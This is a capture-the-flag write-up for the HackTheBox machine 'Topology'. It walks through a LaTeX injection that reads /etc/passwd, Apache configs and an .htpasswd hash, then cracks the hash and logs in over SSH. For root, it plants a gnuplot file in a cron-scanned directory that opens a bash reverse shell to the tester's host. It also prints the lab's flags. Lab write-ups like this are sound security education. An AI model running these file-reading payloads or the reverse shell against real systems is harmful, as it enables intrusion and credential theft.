---
title: HTB - Topology
date: 2024-01-21
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, topology, nmap, apache, htaccess, htpasswd, latex, pspy, cron, gnuplot, revshellgen, subdomain, vhost]
img_path: /assets/htb/fullpwn/topology/
published: true
image:
    path: machine_info.png
---

## Overview

[Topology](https://app.hackthebox.com/machines/Topology) is an Easy Difficulty Linux machine that showcases a **LaTeX** web application susceptible to a **Local File Inclusion (LFI)** vulnerability. 

**Initial foothold**: Exploiting the LFI flaw allows for the retrieval of an `.htpasswd` file that contains a hashed password.

**Privilege escalation**: By cracking the password hash, `SSH` access to the machine is obtained, revealing a `root` cronjob that executes `gnuplot` files. Crafting a malicious `.plt` file enables privilege escalation.

## Info gathering

Let's start with a quick `nmap` scan:

```bash
sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.217
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
```

Info from Nmap:
- SSH server but we need creds for that.
	- `OpenSSH 8.2p1` --> nothing interesting
	- Run `ssh_audit.py` --> not much
- HTTP server open
	- version `Apache 2.4.41` --> not much

## HTTP enum

Homepage:

![](home.png)

Things to note down:
1. Staff names:
	- Lilian Klein, *Head of Topology Group*
	- **Vajramani Daisley, *Software Developer*** --> Interesting
	- **Derek Abrahams, *Sysadmin*** --> Interesting
2. **LaTeX Equation Generator** project:
	- Link redirects to `http://latex.topology.htb/equation.php`. --> Add domain to local DNS file
3. Site powered by **w3.css**. --> not much

Add domain to `/etc/hosts`:

```bash
$ cat /etc/hosts | grep topo
10.10.11.217    topology.htb latex.topology.htb
```

Technologies used:

```bash
$ whatweb http://10.10.11.217
http://10.10.11.217 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[lklein@topology.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.217], Title[Miskatonic University | Topology Group]
```

![](wappa.png){: .normal width="65%"}

## Initial foothold

Latex project homepage:

![](latex_home.png)

Taken from the site: 

> _Please enter **LaTeX inline math mode** syntax in the text field (only oneliners supported at the moment). Clicking "Generate" will directly return a .PNG file that you can save with Ctrl+S (or Command+S if on Mac)._

My mind went directly into the [Precious](https://cspanias.github.io/posts/HTB-Precious/) machine where the app generated a PDF file instead of a PNG file and we were able to see the tool's version via the file's metadata. 

If we copy a random equation from the ***Examples*** section and click ***Generate***, an image will be generated where we can right-click > Save As and check its metadata:

![](equation.png){: .normal width="65%"}

![](png_file.png){: .normal width="65%"}

```bash
# check file's metadata
$ exiftool equation.png
ExifTool Version Number         : 12.70
File Name                       : equation.png
Directory                       : .
File Size                       : 1073 bytes
File Modification Date/Time     : 2024:01:21 21:27:48+00:00
File Access Date/Time           : 2024:01:21 21:27:48+00:00
File Inode Change Date/Time     : 2024:01:21 21:27:48+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 63
Image Height                    : 58
Bit Depth                       : 8
Color Type                      : Grayscale with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255
Pixels Per Unit X               : 300
Pixels Per Unit Y               : 300
Pixel Units                     : Unknown
Modify Date                     : 2024:01:21 11:27:36
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2024-01-21T16:27:36-05:00
Datemodify                      : 2024-01-21T16:27:36-05:00
Pdf Version                     : PDF-1.5
Image Size                      : 63x58
Megapixels                      : 0.004
```

Another way of finding out the version is intercepting the packet via Burp:

![](burp_request.png)

Since we now have the tool's version: `Pfd Version`: `PDF-1.5`, we can start searching for any known vulnerability; unfortunately, this does not get us anywhere. Upon furthor inspection, we notice that the app is hosted in the `/equation.php` directory, and not on `/index.php` where usually the homepage is. If we remove the file, we get the whole site's directory:

![](root_dir.png){: .normal width="65%"}

Among the files, we find two `tex` files: `equationtest.tex` and `header.tex`. According to [Lifewire](https://www.lifewire.com/tex-file-4153927#:~:text=A%20file%20with%20the%20TEX,format%2C%20letter%20format%2C%20etc.):  

> _A file with the TEX file extension is most likely a **source document created by LaTeX that's used to define the structure of a book or other document**, like whether to make it into an article format, letter format, etc. It's a **plain text format** that might include not only text characters but also symbols and mathematical expressions._

The `header.tex` contain an interesting package called `listings` which seems to be able to load files, thus, it has the potential to be susceptible to a [Local File Inclusion (LFI)](https://highon.coffee/blog/lfi-cheat-sheet/) vulnerability: 

```tex
% vdaisley's default latex header for beautiful documents
\usepackage[utf8]{inputenc} % set input encoding
\usepackage{graphicx} % for graphic files
\usepackage{eurosym} % euro currency symbol
\usepackage{times} % set nice font, tex default font is not my style
\usepackage{listings} % include source code files or print inline code
\usepackage{hyperref} % for clickable links in pdfs
\usepackage{mathtools,amssymb,amsthm} % more default math packages
\usepackage{mathptmx} % math mode with times font
```

After reading the [official documentation](https://anorien.csc.warwick.ac.uk/mirrors/CTAN/macros/latex/contrib/listings/listings.pdf) of the package, we notice an interesting functionality:

![](listing_functionality.png){: .normal}

Playing around with it, we get back an error:

![](listing_payload.png){: .normal}

![](error_msg.png)

As our payloads are not working, we search a bit more about LaTex's functionality, in particular, LaTeX modes:

> _Please enter LaTeX **inline math mode** syntax in the text field (**only oneliners supported** at the moment)._

An interesting [article](https://www1.cmc.edu/pages/faculty/aaksoy/latex/latexthree.html) pops up with the following information:

|Method|Special Characteristics|Usage|
|---|---|---|
|\$....$ |None|In-line math|
|\begin{equation} \end{equation}|Goes to a newline and center equation with label|Equations|
|\\[ ....\\] |Goes to a newline and center equation|Equations with no label|

There is also a [Hacktricks article](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection#latex-injection) which includes a lit of payloads for reading files, including the `\lstinputlisting` method. Apparently, LaTeX's inline math mode needs to be enclosed with the `$` symbol. 

If we now try the following payload: `$\lstinputlisting{/etc/passwd}$`, we get the file back:

![](passwd_file.png){: .normal width="75%"}

We can target for more interesting files, like the web server's configuration file. Let's find out where that is:

![](google_config_file.png){: .normal width="75%"}

Sending the payload `$\lstinputlisting{/etc/apache2/httpd.conf}$` results in an error. After trying different file paths, we find out [this](https://ubuntu.com/server/docs/how-to-configure-apache2-settings) article which mentions that the default location of the vhost config file is: `/etc/apache2/sites-available/000-default.conf`. Let's try that by passing `$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}$` as our payload:

![](vhosts.png){: .normal width="65%"}

This config file lists two other vhosts apart from `latex`: `stats` and `dev`! Let's first add them to `/etc/hosts` and then browse to them:

```bash
$ cat /etc/hosts | grep topol
10.10.11.217    topology.htb latex.topology.htb stats.topology.htb dev.topology.htb
```

The `stats` vhost does not contain much:

![](stats.png)

The `dev` one asks for credentials:

![](dev.png)

The config file gave us the username of the server admin: `vdaisley`, but we have no password for it. However, we know the webroot for `dev.topology.htb`, thus, we can try accessing the `.htaccess` file. Taken from [digitalocean](https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file):

> _An `.htaccess` file is used for an Apache web server as **a way to configure the details of your website without altering the server configuration files***. It can be used to load customized error pages (such as 404 pages), create URL redirects, implement password-protected authentication for specific directories on your server, and more._

A bit [later](https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file#authentication) in the article:

> _To set up security authentication with `.htaccess`, you can create a password file called `.htpasswd` to authenticate users. **Making this change will create a password portal that prompts site visitors to enter a password if they want to access certain sections of the webpage**. When creating this file, **make sure to store it somewhere other than the web directory for security reasons**._

We can therefore trying to see if we can locate the `.htaccess` file and then search for the `.htpasswd` file. We can do that by passing the following payload: `$\lstinputlisting{/var/www/dev/.htaccess}$`.

![](htaccess.png){: .normal width="65%"}

Not only we found the `.htaccess` file, but it seems that the `.htpasswd` is also within the root directory! Let's pass `$\lstinputlisting{/var/www/dev/.htpasswd}$` as our payload:

![](htpasswd.png)

We now have credentials: `vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`! We can try to crack the hashed password offline:

```bash
$ cat hash
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

<SNIP>

calculus20       (vdaisley)

<SNIP>
```

That was an MD5 hash and was cracked pretty fast. We can now use our plaintext creds: `vdaisley:calculus20` to login into SSH:

```bash
$ ssh vdaisley@10.10.11.217

<SNIP>

vdaisley@topology:~$ ls
user.txt
vdaisley@topology:~$ cat user.txt
8eda57d8e732e9a2d28917a56a0f5aa1
```

## Privilege escalation

After searching for SUID binaries and any `sudo` privileges, we did not find much. We can use [`pspy`](https://github.com/DominicBreuker/pspy) to enumerate the running processes by downloading a suitable binary and transferring and then executing it to the target via a Python HTTP server:

```bash
# starting a Python HTTP server
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
# downloading the binary from the target
vdaisley@topology:~$daisley@topology:~$ wget http://10.10.14.16:8888/pspy64
--2024-01-22 03:29:56--  http://10.10.14.16:8888/pspy64
Connecting to 10.10.14.16:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                         100%[====================================================>]   2.96M  2.17MB/s    in 1.4s

2024-01-22 03:29:57 (2.17 MB/s) - ‘pspy64’ saved [3104768/3104768]

# giving execute permissions on the binary
vdaisley@topology:~$ chmod +x pspy64
# checking file's permissions
vdaisley@topology:~$ ls -l pspy64
-rwxrwxr-x 1 vdaisley vdaisley 3104768 Jan 22 03:24 pspy64
# executing the binary
./pspy64
```

After waiting for a couple of minutes, we can see a cron job, related to the `getdata.sh` script, that is executed repeatedly as `root` (`UID=0`):

![](getdata_sh.png)

This job seems to be running the `find /opt/gunplot -name *.plt -exec gunplot {} ;` command listed there. What this does:

1. Searches for files with the `.plt` extension within the `/opt/gunplot` directory and its subdirectories.
2. For each file found, it executes the commands `gunploit {}`, where `{}` represents the file path.

We can't read the `getdata.sh` script cause we have no `read` permissions. However, if we check the directory's permissions we will see something interesting:

```bash
# checking directory's permissions
vdaisley@topology:~$ ls -ld /opt/gnuplot
drwx-wx-wx 2 root root 4096 Jun 14  2023 /opt/gnuplot
```

It seems that this directory's permissions are misconfigured: we don't have `read` access, but we have both `write` and `execute`! As a result, if we manage to create a `.plt` file containing reverse shell code within the `/opt/gnuplot`, we will be able to get a `root` shell back. 

Before doing that, let's find out what <a href="http://gnuplot.info/docs_5.5/loc68.html" data-proofer-ignore>**gnuplot**</a> is:

> _**Gnuplot** is a portable command-line driven graphing utility for Linux, OS/2, MS Windows, OSX, VMS, and many other platforms._

Upon looking at the <a href="http://gnuplot.info/docs_5.5/Commands.html" data-proofer-ignore>**Commands**</a> section, we see this:

![](gnuplot_commands.png)

The <a href="http://gnuplot.info/docs_5.5/loc17674.html" data-proofer-ignore>**shell**</a> command's descriptions mentions: 

> _The **shell** command ignores anything else on the gnuplot command line. If instead you want to pass a command string to a shell for immediate execution, use the <a href="http://gnuplot.info/docs_5.5/loc2298.html" data-proofer-ignore>**system**</a> function or the shortcut **!**_

The <a href="http://gnuplot.info/docs_5.5/loc18483.html" data-proofer-ignore>**system**</a> seems more appropriate for getting a reverse shell:

> _**system "command"** executes "command" in a subprocess by invoking the operating system's default shell. If called as a function, **system("command")** returns the character stream from the subprocess's stdout as a string. One trailing newline is stripped from the resulting string if present._

We can try creating a `.plt` file using the **system** command in order to get a reverse shell. First, we can get the revshell code via [revshellgen](https://github.com/t0thkr1s/revshellgen):

```bash
/opt/revshellgen/revshellgen.py

---------- [ SELECT IP ] ----------

[   ] 172.31.150.94 on eth0
[   ] 172.17.0.1 on docker0
[ x ] 10.10.14.16 on tun0
[   ] Specify manually

---------- [ SPECIFY PORT ] ----------

[ # ] Enter port number : 1337

---------- [ SELECT COMMAND ] ----------

[ x ] unix_bash
[   ] unix_java
[   ] unix_nc_mkfifo
[   ] unix_nc_plain
[   ] unix_perl
[   ] unix_php
[   ] unix_python
[   ] unix_ruby
[   ] unix_telnet
[   ] windows_powershell

---------- [ SELECT ENCODE TYPE ] ----------

[ x ] NONE
[   ] URL ENCODE
[   ] BASE64 ENCODE

---------- [ FINISHED COMMAND ] ----------

bash -i >& /dev/tcp/10.10.14.16/1337 0>&1

[ ! ] Reverse shell command copied to clipboard!
[ + ] In case you want to upgrade your shell, you can use this:

python -c 'import pty;pty.spawn("/bin/bash")'

---------- [ SETUP LISTENER ] ----------

[ x ] yes
[   ] no
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
```

We have our listener open, so we are ready to create the `.plt` file and see what happens:

```bash
vdaisley@topology:~$ nano system_command.plt
vdaisley@topology:~$ cat system_command.plt
system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/1337 0>&1'")
vdaisley@topology:~$ cp system_command.plt /opt/gnuplot/
```

Back to our listener:

```bash
---------- [ SETUP LISTENER ] ----------

[ x ] yes
[   ] no
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.11.217:36174.
bash: cannot set terminal process group (4236): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# cat /root/root.txt
cat /root/root.txt
75767b0bf7f675efb539256549a87b4f
```

## Extra

We can perform a scan for virtual hosts and subdomains right at the start of our web server enumeration. Let's remind ourselves what's the difference between a subdomain and a vhost is:

_A **subdomain** is a **part of a larger domain**. It is a way to organize and structure a website's content hierarchy. Subdomains are created by adding a prefix to the main domain, forming a new address. For example, if `example.com` is the main domain, `blog.example.com` and `shop.example.com` could be subdomains. Subdomains are often **used to divide a website into distinct sections**, each with its own content or purpose._

_A **vhost**, is a **configuration method used by web servers** (like Apache or Nginx) to host **multiple domain names on a single server**. With virtual hosting, a single physical server can serve content for multiple domains, and **each domain is treated as if it has its own server instance**. Vhosts are defined in the web server's configuration files, and they allow different websites to coexist on the same server, each with its own settings, files, and configurations._

In summary:
- A subdomain is a way to structure the content within a domain.
- A vhost is a configuration setting that allows a single server to host multiple domains. 

> _You can have subdomains within a vhost, meaning that a server configured with virtual hosts can serve content for multiple domains and their respective subdomains._

We can use `ffuf` for our scan:

```bash
# subdomain enumeration with ffuf
$ ffuf -u http://topology.htb -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -ac -H "HOST: FUZZ.topology.htb"

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 3873ms]
latex                   [Status: 200, Size: 2828, Words: 171, Lines: 26, Duration: 3179ms]
stats                   [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 3203ms]
```

We can also use `gobuster` in a similar fashion:

```bash
# subdomain enumeration with gobuster
$ gobuster vhost -u http://topology.htb -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt --append-domain
```